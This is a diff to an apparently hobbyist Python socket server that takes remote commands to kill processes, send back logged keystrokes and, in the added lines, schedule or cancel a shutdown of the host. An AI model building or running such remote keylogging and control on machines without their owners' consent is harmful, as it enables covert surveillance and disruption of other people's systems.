@@ -5,7 +5,7 @@ import time
 from ScreenShot import*
 from RunningProccess import*
 from KeyLogger import*
-
+from ShutDown import*
 HEADER = 64
 PORT = 5050
 #SERVER = socket.gethostbyname(socket.gethostname())
@@ -19,7 +19,8 @@ STOP_LISTING = "STOP LISTING"
 KILL_PROCESS_VIA_PID = "KILL PROCESS VIA PID"
 KILL_PROCESS_VIA_NAME = "KILL PROCESS VIA NAME"
 KEY_LOGGING ="KEY LOG"
-
+SHUTDOWN = "SHUTDOWN"
+CANCEL_SHUTDOWN = "CANCEL SHUTDOWN"
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind(ADDR)
@@ -87,7 +88,16 @@ def handle_client(conn, addr):
                 #print(key_log_string)
                 conn.send(key_log_string.encode(FORMAT))
                 reply += "KEYLOG FINISH"
+            elif msg == SHUTDOWN:
+                conn.send("Input time remained until shutdown: ".encode(FORMAT))
+                sec = conn.recv(1024).decode(FORMAT)
+                reply += f"SERVER WILL SHUTDOWN IN {sec} SECONDS"
+                sec = int(sec)
+                shutdown(sec)
 
+            elif msg == CANCEL_SHUTDOWN:
+                cancel_shutdown()
+                reply += "SHUTDOWN CANCELED"
 
             elif msg == DISCONNECT_MESSAGE:
                 reply +="CONNECTION TERMINATED!"
